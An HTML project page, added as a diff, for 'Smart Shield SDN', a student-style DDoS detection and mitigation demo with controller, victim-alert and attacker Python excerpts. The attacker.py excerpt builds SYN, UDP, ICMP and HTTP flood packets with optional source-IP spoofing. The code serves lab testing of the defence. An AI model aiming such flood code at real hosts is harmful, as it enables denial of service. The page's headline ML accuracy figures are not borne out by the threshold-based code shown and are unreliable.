@@ -1,0 +1,465 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Smart Shield SDN | Complete Project Website</title>
+<style>
+*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:#030712;color:#f5f8ff;font-family:Inter,Segoe UI,Arial,sans-serif;line-height:1.6}body:before{content:"";position:fixed;inset:0;pointer-events:none;opacity:.1;background-image:linear-gradient(#fff1 1px,transparent 1px),linear-gradient(90deg,#fff1 1px,transparent 1px);background-size:42px 42px}a{color:inherit;text-decoration:none}.wrap{max-width:1180px;margin:auto;padding:0 22px}nav{position:sticky;top:0;z-index:10;background:#030712dd;backdrop-filter:blur(14px);border-bottom:1px solid #27dcff33}.nav{height:70px;display:flex;align-items:center;justify-content:space-between}.brand{font-weight:950;letter-spacing:1.3px}.brand span,.cyan{color:#27dcff}.links{display:flex;gap:25px;color:#c5d2e2;font-size:.9rem}.links a:hover,.links .active{color:#27dcff}.menu{display:none;background:none;color:white;border:1px solid #27dcff44;border-radius:8px;padding:8px}.hero{padding:105px 0 80px}.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:50px;align-items:center}.kicker,.eyebrow{color:#27dcff;font-size:.76rem;font-weight:900;letter-spacing:1.6px}.kicker{display:inline-block;border:1px solid #27dcff55;padding:7px 13px;border-radius:30px;background:#27dcff0d}h1{font-size:clamp(3rem,7vw,6.2rem);line-height:.9;letter-spacing:-5px;margin:18px 0}h2{font-size:clamp(2rem,4vw,3.4rem);line-height:1.03;letter-spacing:-2px;margin:8px 0 15px}h3{margin:7px 0 8px}.lead,.muted{color:#9fb0c5}.btns{display:flex;gap:12px;flex-wrap:wrap;margin-top:28px}.btn{display:inline-block;padding:11px 17px;border-radius:10px;border:1px solid #27dcff33;font-weight:850;font-size:.88rem}.primary{background:linear-gradient(135deg,#13bddf,#476dff);border:0}.secondary{background:#ffffff08}.visual{height:380px;position:relative;display:grid;place-items:center}.core{width:180px;height:145px;border:1px solid #27dcff;border-radius:24px;background:linear-gradient(145deg,#10233e,#050d19);display:grid;place-items:center;z-index:2;box-shadow:0 0 35px #27dcff44}.core:after{content:"SDN";font-size:2.6rem;font-weight:950;letter-spacing:4px}.ring{position:absolute;border:1px solid #27dcff33;border-radius:50%;animation:pulse 3s infinite}.r1{width:220px;height:220px}.r2{width:305px;height:305px;animation-delay:.6s}.r3{width:390px;height:390px;animation-delay:1.2s}@keyframes pulse{50%{transform:scale(1.04);opacity:1}}.node{position:absolute;padding:9px 12px;background:#050e1bf5;border:1px solid #27dcff33;border-radius:10px;font-size:.75rem;font-weight:850;z-index:4}.att{left:0;top:39%;color:#ff5364}.vic{right:0;top:39%;color:#73f56a}.ai{top:0;left:50%;transform:translateX(-50%);color:#c0adff}.ctl{bottom:0;left:50%;transform:translateX(-50%);color:#ffd52f}section{padding:80px 0}.head{max-width:760px;margin-bottom:32px}.grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px}.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}.card{background:linear-gradient(145deg,#0c1a2df0,#050d18f0);border:1px solid #27dcff33;border-radius:17px;padding:24px}.metrics{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}.metric{padding:21px;border:1px solid #27dcff33;border-radius:15px;background:#08111f}.big{font-size:2.2rem;color:#27dcff;font-weight:950;line-height:1}.pipeline{display:grid;grid-template-columns:repeat(6,1fr);gap:10px}.step{text-align:center;border:1px solid #27dcff33;border-radius:13px;padding:18px 8px;background:#08111f}.num{width:30px;height:30px;border-radius:50%;border:1px solid #27dcff;display:grid;place-items:center;margin:auto;color:#27dcff;font-weight:900}.arch{overflow:auto;background:#08111f;border:1px solid #27dcff33;border-radius:20px;padding:20px}.badge{display:inline-block;padding:4px 9px;border-radius:30px;font-size:.72rem;font-weight:900;border:1px solid}.online{color:#73f56a;border-color:#73f56a55;background:#73f56a0d}.danger{color:#ff5364;border-color:#ff536455;background:#ff53640d}.dash{display:grid;grid-template-columns:1.2fr .8fr;gap:18px}.statgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}.stat{background:#06101c;border:1px solid #fff1;padding:17px;border-radius:12px}.stat b{font-size:1.5rem}.stat span{display:block;color:#9fb0c5;font-size:.72rem}.chart{height:190px;display:flex;align-items:end;gap:7px;padding:15px 4px}.chart i{flex:1;background:linear-gradient(#27dcff,#274b83);border-radius:5px 5px 1px 1px;min-height:10px}.log{display:grid;grid-template-columns:80px 1fr 100px 90px;gap:10px;padding:12px 0;border-bottom:1px solid #fff1;font-size:.8rem}pre{white-space:pre-wrap;overflow:auto;background:#020810;border:1px solid #27dcff33;border-radius:13px;padding:18px;color:#b9d2e7;font:13px/1.65 Consolas,monospace}.code-tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px}.code-tabs a{padding:8px 12px;border:1px solid #27dcff33;border-radius:8px;color:#9fb0c5}input,textarea{width:100%;padding:12px;background:#050d18;border:1px solid #27dcff33;border-radius:9px;color:white;font:inherit}textarea{min-height:140px}form{display:grid;gap:13px}footer{border-top:1px solid #27dcff33;padding:34px 0;color:#9fb0c5;font-size:.82rem}.foot{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap}.reveal{animation:up .7s ease both}@keyframes up{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}@media(max-width:900px){.links{display:none}.menu{display:block}.hero-grid,.grid2,.dash{grid-template-columns:1fr}.grid3{grid-template-columns:1fr 1fr}.pipeline{grid-template-columns:repeat(2,1fr)}.metrics,.statgrid{grid-template-columns:repeat(2,1fr)}}@media(max-width:560px){.wrap{padding:0 16px}.grid3,.metrics,.statgrid,.pipeline{grid-template-columns:1fr}.visual{transform:scale(.8);margin:-30px 0}h1{letter-spacing:-3px}.log{grid-template-columns:65px 1fr}.log span:nth-child(n+3){display:none}}
+section{scroll-margin-top:78px}
+#home,#about,#dashboard,#code,#contact{scroll-margin-top:70px}
+</style>
+</head><body>
+<nav><div class="wrap nav">
+<a class="brand" href="#home">SMART SHIELD <span>SDN</span></a>
+<button class="menu">☰</button>
+<div class="links">
+<a href="#home">Home</a><a href="#about">About</a><a href="#dashboard">Dashboard</a><a href="#code">Code</a><a href="#contact">Contact</a>
+</div></div></nav>
+
+<div id="home"><section class="hero"><div class="wrap hero-grid"><div><div class="kicker">AI-POWERED • REAL-TIME • EXPLAINABLE</div><h1>SMART<br><span class="cyan">SHIELD SDN</span></h1><p class="lead">An intelligent, privacy-preserving cyber-defense framework for DDoS detection, automated mitigation and human-readable security explanations.</p><div class="btns"><a class="btn primary" href="#dashboard">Open Dashboard</a><a class="btn secondary" href="#about">Explore Project</a></div></div><div class="visual"><div class="ring r1"></div><div class="ring r2"></div><div class="ring r3"></div><div class="node att">⚠ ATTACKER</div><div class="node ai">✦ XAI ENGINE</div><div class="core"></div><div class="node vic">✓ VICTIM</div><div class="node ctl">RYU • OPENFLOW</div></div></div></section><section class="reveal"><div class="wrap"><div class="head"><div class="eyebrow">CORE WORKFLOW</div><h2>Detect → Block → Explain.</h2><p class="muted">Traffic moves from the lab network through feature extraction and ML detection, then into explainability, SDN mitigation and the victim alert layer.</p></div><div class="pipeline"><div class="step"><div class="num">1</div><b>Traffic</b><br><small>Mininet / OVS</small></div><div class="step"><div class="num">2</div><b>Features</b><br><small>CICFlowMeter</small></div><div class="step"><div class="num">3</div><b>Detect</b><br><small>XGBoost + LSTM</small></div><div class="step"><div class="num">4</div><b>Explain</b><br><small>SHAP + LIME</small></div><div class="step"><div class="num">5</div><b>Block</b><br><small>Ryu / OpenFlow</small></div><div class="step"><div class="num">6</div><b>Alert</b><br><small>Victim UI</small></div></div></div></section><section><div class="wrap metrics"><div class="metric"><div class="big">99.1%</div><span class="muted">Ensemble accuracy</span></div><div class="metric"><div class="big">98.9%</div><span class="muted">Ensemble F1</span></div><div class="metric"><div class="big">11 ms</div><span class="muted">Inference latency</span></div><div class="metric"><div class="big">25–30 ms</div><span class="muted">Average mitigation</span></div></div></section></div>
+<div id="about"><section><div class="wrap"><div class="head"><div class="eyebrow">ABOUT THE PROJECT</div><h1 style="font-size:clamp(2.8rem,6vw,5rem);letter-spacing:-3px">Smarter defense.<br><span class="cyan">Clearer decisions.</span></h1><p class="lead">Smart Shield SDN combines Software Defined Networking principles, machine learning and explainable AI to create an automated DDoS defense workflow.</p></div><div class="grid2 reveal"><div class="card"><h3>🛡️ The problem</h3><p class="muted">Static rules and manual intervention can struggle with evolving DDoS traffic. The project focuses on automated detection and mitigation with transparent explanations.</p></div><div class="card"><h3>🧠 The approach</h3><p class="muted">Flow-level features are used by XGBoost and LSTM models. SHAP/LIME-style explainability exposes influential traffic characteristics behind a prediction.</p></div></div></div></section><section><div class="wrap"><div class="head"><div class="eyebrow">THREAT COVERAGE</div><h2>Four attack patterns.</h2></div><div class="grid3"><div class="card"><h3>🔴 SYN Flood</h3><p class="muted">TCP SYN-heavy traffic targeting connection state.</p></div><div class="card"><h3>🟡 UDP Flood</h3><p class="muted">High-volume UDP traffic targeting bandwidth.</p></div><div class="card"><h3>🔵 HTTP Flood</h3><p class="muted">Layer-7 HTTP request flooding.</p></div><div class="card"><h3>🟣 ICMP Flood</h3><p class="muted">Excessive ICMP traffic targeting processing resources.</p></div><div class="card"><h3>📊 Flow Features</h3><p class="muted">Packet rate, TCP flags, byte counts, inter-arrival time and protocol distribution.</p></div><div class="card"><h3>🔐 Privacy</h3><p class="muted">The report emphasizes traffic metadata without payload inspection.</p></div></div></div></section></div>
+<div id="dashboard"><section><div class="wrap"><div class="head"><div class="eyebrow">SECURITY OPERATIONS CENTER</div><h1 style="font-size:clamp(2.6rem,5vw,4.5rem);letter-spacing:-3px">Live <span class="cyan">Dashboard</span></h1><p class="muted">A web visualization of the controller + victim monitoring flow from the project implementation.</p></div><div class="statgrid"><div class="stat"><b class="cyan">847</b><span>TRAFFIC PKT/S</span></div><div class="stat"><b style="color:#ff5364">1</b><span>BLOCKED IP</span></div><div class="stat"><b style="color:#73f56a">4</b><span>MITIGATIONS</span></div><div class="stat"><b style="color:#ffd52f">25 ms</b><span>AVG RESPONSE</span></div></div><div style="height:18px"></div><div class="dash"><div class="card"><h3>Network traffic</h3><p class="muted">5-second sliding-window view</p><div class="chart"><i style="height:22%"></i><i style="height:31%"></i><i style="height:44%"></i><i style="height:35%"></i><i style="height:57%"></i><i style="height:49%"></i><i style="height:67%"></i><i style="height:73%"></i><i style="height:61%"></i><i style="height:82%"></i><i style="height:69%"></i><i style="height:91%"></i><i style="height:76%"></i><i style="height:87%"></i><i style="height:64%"></i><i style="height:72%"></i><i style="height:95%"></i><i style="height:80%"></i><i style="height:68%"></i><i style="height:89%"></i></div></div><div class="card"><h3>Threat status</h3><p><span class="badge danger">MITIGATED</span></p><p class="muted">Latest event</p><h3>SYN Flood</h3><p class="muted">Source: 192.168.1.50<br>Rate: 847 pkt/s<br>Target: victim:80</p><span class="badge online">● VICTIM PROTECTED</span></div></div><div style="height:18px"></div><div class="card"><h3>Controller event log</h3><div class="log"><span>12:42</span><span>192.168.1.50 → victim:80</span><span>SYN</span><span style="color:#73f56a">BLOCKED</span></div><div class="log"><span>12:42</span><span>OpenFlow DROP rule installed</span><span>RULE</span><span style="color:#73f56a">ACTIVE</span></div><div class="log"><span>12:43</span><span>AI explanation generated</span><span>XAI</span><span class="cyan">READY</span></div></div><div style="height:18px"></div><div class="grid2"><div class="card"><div class="eyebrow">AI CONTROLLER EXPLANATION</div><h3>Why was this blocked?</h3><p class="muted">SmartShield detected a SYN Flood from the source at approximately 847 packets/sec. The traffic pattern was dominated by SYN packets. A DROP rule was installed for the source and the victim alert layer was updated.</p></div><div class="card"><div class="eyebrow">VICTIM DEVICE</div><h3><span class="badge online">● PROTECTED</span></h3><p class="muted">The supplied victim implementation watches the controller's explanation file and opens a Tkinter alert dashboard when a new event is written.</p></div></div></div></section>{footer}</div>
+<div id="code"><section><div class="wrap"><div class="head"><div class="eyebrow">CODE SECTION</div><h1 style="font-size:clamp(2.8rem,6vw,5rem);letter-spacing:-3px">Inside the<br><span class="cyan">Shield.</span></h1><p class="lead">A dedicated section for the three core Python components. These excerpts are taken from the uploaded project scripts.</p></div><div class="code-tabs"><a href="#controller">controller.py</a><a href="#victim">victim.py</a><a href="#attacker">attacker.py</a></div><div class="card" id="controller"><h3>controller.py</h3><p class="muted">Actual project code excerpt.</p><pre>WINDOW_SECONDS       = 5      # sliding window for rate calculation
+PPS_THRESHOLD        = 100    # packets/sec from single IP → alert
+SYN_RATIO_THRESHOLD  = 0.85   # if &gt;85% of TCP packets are SYN → SYN flood
+UDP_RATIO_THRESHOLD  = 0.80   # if &gt;80% of traffic is UDP → UDP flood
+ICMP_RATIO_THRESHOLD = 0.70   # if &gt;70% of traffic is ICMP → ICMP flood
+
+# ── Shared state ──────────────────────────────────────────────────────────
+packet_log   = []          # list of (timestamp, src_ip, protocol, size, flags)
+blocked_ips  = set()       # IPs whose traffic is being dropped
+attack_log   = []          # list of detected attack events
+state_lock   = threading.Lock()
+running      = True
+
+# ── Banner ────────────────────────────────────────────────────────────────
+def print_banner():
+    print(Fore.CYAN + Style.BRIGHT + &quot;&quot;&quot;
+  ██████╗ ████████╗██████╗ ██╗
+ ██╔════╝    ██╔══╝██╔══██╗██║
+ ██║         ██║   ██████╔╝██║
+ ██║         ██║   ██╔══██╗██║
+ ╚██████╗    ██║   ██║  ██║███████╗
+  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝
+   SmartShield — SDN Controller Node
+&quot;&quot;&quot; + Style.RESET_ALL)
+
+
+# ── Packet sniffer callback ───────────────────────────────────────────────
+def packet_callback(pkt, victim_ip):
+    if not pkt.haslayer(IP):
+        return
+
+    src  = pkt[IP].src
+    dst  = pkt[IP].dst
+    size = len(pkt)
+    ts   = time.time()
+
+    # Only care about traffic going TO the victim
+    if dst != victim_ip:
+        return
+
+    # Identify protocol + flags
+    proto = &quot;OTHER&quot;
+    flags = &quot;&quot;
+    if pkt.haslayer(TCP):
+        proto = &quot;TCP&quot;
+        flags = str(pkt[TCP].flags)
+    elif pkt.haslayer(UDP):
+        proto = &quot;UDP&quot;
+    elif pkt.haslayer(ICMP):
+        proto = &quot;ICMP&quot;
+
+    with state_lock:
+        # If already blocked, silently drop (simulate OpenFlow DROP rule)
+        if src in blocked_ips:
+            return
+        packet_log.append((ts, src, proto, size, flags))
+
+
+# ── Detection engine ──────────────────────────────────────────────────────
+def analyze_traffic(victim_ip):
+    &quot;&quot;&quot;
+    Runs every second. Checks packet log for attack signatures:
+      1. High pkt/s from a single source IP
+      2. SYN flood (TCP with S flag dominating)
+      3. UDP flood
+      4. ICMP flood
+    Returns list of (attacker_ip, attack_type, pps) tuples.
+    &quot;&quot;&quot;
+    now = time.time()
+    window_start = now - WINDOW_SECONDS
+    detections = []
+
+    with state_lock:
+        # Only look at packets in the sliding window
+        recent = [p for p in packet_log if p[0] &gt;= window_start]
+
+    if not recent:
+        return detections
+
+    # Group by source IP
+    by_src = defaultdict(list)
+    for ts, src, proto, size, flags in recent:
+        by_src[src].append((ts, proto, size, flags))
+
+    for src_ip, pkts in by_src.items():
+        pps = len(pkts) / WINDOW_SECONDS
+
+        if pps &lt; PPS_THRESHOLD:
+            continue  # below threshold — normal traffic
+
+        # Count protocol breakdown
+        tcp_pkts  = [p for p in pkts if p[1] == &quot;TCP&quot;]
+        syn_pkts  = [p for p in tcp_pkts if &quot;S&quot; in p[3] and &quot;A&quot; not in p[3]]
+        udp_pkts  = [p for p in pkts if p[1] == &quot;UDP&quot;]
+        icmp_pkts = [p for p in pkts if p[1] == &quot;ICMP&quot;]
+        total     = len(pkts)
+
+        if total == 0:
+            continue
+
+        # Classify attack type
+        attack_type = None
+        if tcp_pkts and len(syn_pkts) / max(len(tcp_pkts), 1) &gt;= SYN_RATIO_THRESHOLD:
+            attack_type = &quot;SYN Flood&quot;
+        elif len(udp_pkts) / total &gt;= UDP_RATIO_THRESHOLD:
+            attack_type = &quot;UDP Flood&quot;
+        elif len(icmp_pkts) / total &gt;= ICMP_RATIO_THRESHOLD:
+            attack_type = &quot;ICMP Flood&quot;
+        elif pps &gt;= PPS_THRESHOLD:
+            attack_type = &quot;HTTP/Generic Flood&quot;
+
+        if attack_type:
+            detections.append((src_ip, attack_type, round(pps, 1), total))
+
+    return detections
+
+
+# ── Mitigation: push block rule ───────────────────────────────────────────
+def push_block_rule(attacker_ip, attack_type, victim_ip, pps):
+    &quot;&quot;&quot;
+    Simulates pushing an OpenFlow DROP rule.
+    In a real Ryu SDN setup this would call:
+        datapath.send_msg(parser.OFPFlowMod(...))
+    Here we add the IP to blocked_ips so the sniffer ignores its packets.
+    &quot;&quot;&quot;
+    with state_lock:
+        blocked_ips.add(attacker_ip)
+
+    ts = datetime.now().strftime(&quot;%H:%M:%S&quot;)
+    print(Fore.GREEN + Style.BRIGHT + f&quot;\n  ✅ [{ts}] FLOW RULE PUSHED&quot;)
+    print(Fore.GREEN + f&quot;     DROP src={attacker_ip} → dst={victim_ip} dport=80&quot;)
+    print(Fore.GREEN + f&quot;     Rule type   : {attack_type}&quot;)
+    print(Fore.GREEN + f&quot;     Packets/sec : {pps}&quot;)
+    print(Fore.GREEN + f&quot;     Priority    : 1000  | Hard timeout: 300s\n&quot;)
+
+    event = {
+        &quot;ts&quot;: ts,
+        &quot;attacker&quot;: attacker_ip,
+        &quot;victim&quot;: victim_ip,
+        &quot;type&quot;: attack_type,
+        &quot;pps&quot;: pps,
+    }
+    with state_lock:
+        attack_log.append(event)
+    return event
+
+
+</pre></div><div style="height:18px"></div><div class="card" id="victim"><h3>victim.py</h3><p class="muted">Actual project code excerpt.</p><pre>def parse_explanation_file(filepath):
+    &quot;&quot;&quot;
+    Reads the file controller.py writes.
+    Returns a dict with attack details + explanation text.
+    &quot;&quot;&quot;
+    data = {
+        &quot;attacker&quot;: &quot;Unknown&quot;,
+        &quot;victim&quot;:   &quot;Unknown&quot;,
+        &quot;type&quot;:     &quot;Unknown&quot;,
+        &quot;pps&quot;:      &quot;?&quot;,
+        &quot;time&quot;:     &quot;?&quot;,
+        &quot;status&quot;:   &quot;UNKNOWN&quot;,
+        &quot;explanation&quot;: &quot;&quot;,
+    }
+    try:
+        with open(filepath, &quot;r&quot;) as f:
+            lines = f.readlines()
+
+        reading_explanation = False
+        explanation_lines = []
+
+        for line in lines:
+            line = line.rstrip()
+            if line == &quot;---&quot;:
+                reading_explanation = True
+                continue
+            if reading_explanation:
+                explanation_lines.append(line)
+            elif &quot;=&quot; in line:
+                key, _, val = line.partition(&quot;=&quot;)
+                key = key.strip().lower()
+                val = val.strip()
+                if key in data:
+                    data[key] = val
+
+        data[&quot;explanation&quot;] = &quot; &quot;.join(explanation_lines).strip()
+    except Exception as e:
+        data[&quot;explanation&quot;] = f&quot;Could not read explanation: {e}&quot;
+
+    return data
+
+
+# ── Tkinter Alert Dashboard ───────────────────────────────────────────────
+def show_dashboard(data):
+    global dashboard_open
+    dashboard_open = True
+
+    root = tk.Tk()
+    root.title(&quot;SmartShield — Security Alert&quot;)
+    root.configure(bg=&quot;#060e18&quot;)
+    root.resizable(False, False)
+
+    # Center on screen
+    w, h = 680, 560
+    sw = root.winfo_screenwidth()
+    sh = root.winfo_screenheight()
+    root.geometry(f&quot;{w}x{h}+{(sw-w)//2}+{(sh-h)//2}&quot;)
+
+    # ── Fonts ──
+    try:
+        title_font  = tkfont.Font(family=&quot;Consolas&quot;, size=16, weight=&quot;bold&quot;)
+        header_font = tkfont.Font(family=&quot;Consolas&quot;, size=11, weight=&quot;bold&quot;)
+        body_font   = tkfont.Font(family=&quot;Consolas&quot;, size=9)
+        small_font  = tkfont.Font(family=&quot;Consolas&quot;, size=8)
+        stat_font   = tkfont.Font(family=&quot;Consolas&quot;, size=18, weight=&quot;bold&quot;)
+    except:
+        title_font  = tkfont.Font(size=14, weight=&quot;bold&quot;)
+        header_font = tkfont.Font(size=10, weight=&quot;bold&quot;)
+        body_font   = tkfont.Font(size=9)
+        small_font  = tkfont.Font(size=8)
+        stat_font   = tkfont.Font(size=16, weight=&quot;bold&quot;)
+
+    is_mitigated = data.get(&quot;status&quot;, &quot;&quot;).upper() == &quot;MITIGATED&quot;
+
+    # ── Animate the border color ──
+    border_colors_alert    = [&quot;#ff2200&quot;, &quot;#ff6600&quot;, &quot;#ff2200&quot;, &quot;#aa0000&quot;]
+    border_colors_mitigated = [&quot;#00cc77&quot;, &quot;#00ff99&quot;, &quot;#00cc77&quot;, &quot;#009955&quot;]
+    border_seq = border_colors_mitigated if is_mitigated else border_colors_alert
+    border_idx = [0]
+
+    # ── Top banner ──
+    if is_mitigated:
+        banner_bg   = &quot;#001a0e&quot;
+        banner_fg   = &quot;#00ff88&quot;
+        banner_text = &quot;🛡  ATTACK MITIGATED — YOU ARE SAFE&quot;
+        status_color = &quot;#00cc77&quot;
+    else:
+        banner_bg   = &quot;#1a0000&quot;
+        banner_fg   = &quot;#ff3300&quot;
+        banner_text = &quot;⚠   DDoS ATTACK IN PROGRESS&quot;
+        status_color = &quot;#ff4444&quot;
+
+    banner = tk.Label(
+        root, text=banner_text,
+        bg=banner_bg, fg=banner_fg,
+        font=title_font,
+        pady=14,
+    )
+    banner.pack(fill=tk.X)
+
+    # Subtitle
+    subtitle_text = (
+        &quot;SmartShield SDN Controller has blocked the attack and protected your server.&quot;
+        if is_mitigated else
+        &quot;Your server is currently under a DDoS attack. Controller is responding...&quot;
+    )
+    tk.Label(
+        root, text=subtitle_text,
+        bg=&quot;#060e18&quot;, fg=&quot;#4a6070&quot;,
+        font=small_font, wraplength=640, pady=4,
+    ).pack(fill=tk.X, padx=20)
+
+    # ── Separator ──
+    tk.Frame(root, bg=&quot;#0a2030&quot;, height=1).pack(fill=tk.X, padx=20, pady=4)
+
+    # ── Stats row ──
+    stats_frame = tk.Frame(root, bg=&quot;#060e18&quot;)
+    stats_frame.pack(fill=tk.X, padx=20, pady=8)
+
+    def stat_box(parent, val, label, val_color):
+        box = tk.Frame(parent, bg=&quot;#0a1520&quot;, bd=0, relief=tk.FLAT)
+        box.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=5)
+        tk.Label(box, text=val, bg=&quot;#0a1520&quot;, fg=val_color,
+                 font=stat_font, pady=8).pack()
+        tk.Label(box, text=label, bg=&quot;#0a1520&quot;, fg=&quot;#304050&quot;,
+                 font=small_font, pady=2).pack()
+
+    stat_box(stats_frame, data[&quot;attacker&quot;], &quot;ATTACKER IP&quot;,  &quot;#ff5544&quot; if not is_mitigated else &quot;#cc4433&quot;)
+    stat_box(stats_frame, data[&quot;type&quot;],     &quot;ATTACK TYPE&quot;,  &quot;#ff8844&quot; if not is_mitigated else &quot;#aa6633&quot;)
+    stat_box(stats_frame, f&quot;{data[&#x27;pps&#x27;]} p/s&quot;, &quot;PACKET RATE&quot;, &quot;#ffcc00&quot; if not is_mitigated else &quot;#008855&quot;)
+    stat_box(stats_frame, &quot;✓ SAFE&quot; if is_mitigated else &quot;ACTIVE&quot;, &quot;STATUS&quot;, status_color)
+
+    # ── Separator ──
+    tk.Frame(root, bg=&quot;#0a2030&quot;, height=1).pack(fill=tk.X, padx=20, pady=4)
+
+    # ── Details row ──
+    details_frame = tk.Frame(root, bg=&quot;#060e18&quot;)
+    details_frame.pack(fill=tk.X, padx=20, pady=4)
+
+    def detail_row(label, value, fg=&quot;#6090a0&quot;):
+        row = tk.Frame(details_frame, bg=&quot;#060e18&quot;)
+        row.pack(fill=tk.X, pady=1)
+        tk.Label(row, text=f&quot;  {label:&lt;18}&quot;, bg=&quot;#060e18&quot;, fg=&quot;#304050&quot;,
+                 font=body_font, anchor=&quot;w&quot;).pack(side=tk.LEFT)
+        tk.Label(row, text=value, bg=&quot;#060e18&quot;, fg=fg,
+                 font=body_font, anchor=&quot;w&quot;).pack(side=tk.LEFT)
+
+    detail_row(&quot;Your IP (victim):&quot;, data[&quot;victim&quot;],   &quot;#4488ff&quot;)
+    detail_row(&quot;Detected at:&quot;,      data[&quot;time&quot;],     &quot;#6090a0&quot;)
+    detail_row(&quot;Controller action:&quot;, &quot;OpenFlow DROP rule installed — traffic blocked at switch level&quot;,
+               &quot;#00aa66&quot; if is_mitigated else &quot;#aa4433&quot;)
+
+    # ── Separator ──
+    tk.Frame(root, bg=&quot;#0a2030&quot;, height=1).pack(fill=tk.X, padx=20, pady=4)
+
+    # ── AI Explanation box ──
+    tk.Label(
+        root, text=&quot;🤖  AI CONTROLLER EXPLANATION&quot;,
+        bg=&quot;#060e18&quot;, fg=&quot;#005577&quot;,
+        font=small_font, anchor=&quot;w&quot;,
+    ).pack(fill=tk.X, padx=26, pady=(4, 2))
+
+    exp_frame = tk.Frame(root, bg=&quot;#020c14&quot;, bd=1, relief=tk.FLAT)
+    exp_frame.pack(fill=tk.BOTH, padx=20, pady=4, expand=True)
+
+    exp_text = tk.Text(
+        exp_frame,
+        bg=&quot;#020c14&quot;, fg=&quot;#5599aa&quot;,
+        font=body_font,
+        wrap=tk.WORD,
+        relief=tk.FLAT,
+        padx=12, pady=10,
+        height=5,
+        state=tk.NORMAL,
+        cursor=&quot;arrow&quot;,
+    )
+    exp_text.insert(tk.END, data[&quot;explanation&quot;] or &quot;Waiting for controller explanation...&quot;)
+    exp_text.config(state=tk.DISABLED)
+    exp_text.pack(fill=tk.BOTH, expand=True)
+
+    # ── Bottom bar ──
+    bottom = tk.Frame(root, bg=&quot;#030912&quot;, pady=8)
+    bottom.pack(fill=tk.X, side=tk.BOTTOM)
+
+    tk.Label(
+        bottom,
+        text=f&quot;SmartShield SDN Controller  ·  {datetime.now().strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)}&quot;,
+        bg=&quot;#030912&quot;, fg=&quot;#1a3040&quot;,
+        font=small_font,
+    ).pack(side=tk.LEFT, padx=16)
+
+    close_btn = tk.Button(
+        bottom, text=&quot;  ✕  DISMISS  &quot;,
+        bg=&quot;#0a1a28&quot;, fg=&quot;#4a7090&quot;,
+        font=small_font,
+        relief=tk.FLAT,
+        activebackground=&quot;#0d2030&quot;,
+        activeforeground=&quot;#88bbcc&quot;,
+        command=root.destroy,
+        cursor=&quot;hand2&quot;,
+        padx=8, pady=4,
+    )
+    close_btn.pack(side=tk.RIGHT, padx=16)
+
+    # ── Animated border via title bar color cycling ──
+    def animate_border():
+        if not root.winfo_exists():
+            return
+        color = border_seq[border_idx[0] % len(border_seq)]
+        banner.config(bg=banner_bg)
+        if not is_mitigated:
+            banner.config(fg=color)
+        border_idx[0] += 1
+        root.after(400, animate_border)
+
+    animate_border()
+
+    def on_close():
+        global dashboard_open
+        dashboard_open = False
+        root.destroy()
+
+    root.protocol(&quot;WM_DELETE_WINDOW&quot;, on_close)
+    root.mainloop()
+    dashboard_open = False
+
+
+</pre></div><div style="height:18px"></div><div class="card" id="attacker"><h3>attacker.py</h3><p class="muted">Actual project code excerpt.</p><pre>def build_syn_packet(target_ip, target_port, spoof):
+    &quot;&quot;&quot;TCP SYN flood — half-open connections exhaust server state table.&quot;&quot;&quot;
+    src_ip = str(RandIP()) if spoof else None
+    pkt = IP(dst=target_ip, src=src_ip) / TCP(
+        sport=RandShort(),
+        dport=target_port,
+        flags=&quot;S&quot;,                    # SYN only
+        seq=random.randint(0, 2**32),
+        window=65535,
+    )
+    return pkt
+
+
+def build_udp_packet(target_ip, target_port, spoof):
+    &quot;&quot;&quot;UDP flood — saturates bandwidth with random payload.&quot;&quot;&quot;
+    src_ip = str(RandIP()) if spoof else None
+    payload = Raw(load=random.randbytes(random.randint(64, 1400)))
+    pkt = IP(dst=target_ip, src=src_ip) / UDP(
+        sport=RandShort(),
+        dport=target_port,
+    ) / payload
+    return pkt
+
+
+def build_icmp_packet(target_ip, spoof):
+    &quot;&quot;&quot;ICMP Echo (Ping) flood — overwhelms ICMP processing.&quot;&quot;&quot;
+    src_ip = str(RandIP()) if spoof else None
+    payload = Raw(load=b&quot;X&quot; * random.randint(56, 1400))
+    pkt = IP(dst=target_ip, src=src_ip) / ICMP() / payload
+    return pkt
+
+
+def build_http_packet(target_ip, target_port, spoof):
+    &quot;&quot;&quot;HTTP GET flood — layer-7 flood on port 80.&quot;&quot;&quot;
+    src_ip = str(RandIP()) if spoof else None
+    paths = [&quot;/&quot;, &quot;/index.html&quot;, &quot;/login&quot;, &quot;/api/data&quot;, &quot;/search?q=&quot; + &quot;A&quot; * 50]
+    http_req = (
+        f&quot;GET {random.choice(paths)} HTTP/1.1\r\n&quot;
+        f&quot;Host: {target_ip}\r\n&quot;
+        f&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n&quot;
+        f&quot;Accept: */*\r\n&quot;
+        f&quot;Connection: keep-alive\r\n\r\n&quot;
+    ).encode()
+    pkt = IP(dst=target_ip, src=src_ip) / TCP(
+        sport=RandShort(),
+        dport=target_port,
+        flags=&quot;PA&quot;,   # PSH+ACK (data push)
+    ) / Raw(load=http_req)
+    return pkt
+
+
+# ── Attack type dispatch ───────────────────────────────────────────────────
+
+ATTACK_BUILDERS = {
+    &quot;SYN&quot;:  lambda ip, port, spoof: build_syn_packet(ip, port, spoof),
+    &quot;UDP&quot;:  lambda ip, port, spoof: build_udp_packet(ip, port, spoof),
+    &quot;ICMP&quot;: lambda ip, port, spoof: build_icmp_packet(ip, spoof),
+    &quot;HTTP&quot;: lambda ip, port, spoof: build_http_packet(ip, port, spoof),
+}
+
+
+</pre></div><div style="height:18px"></div></div></section></div>
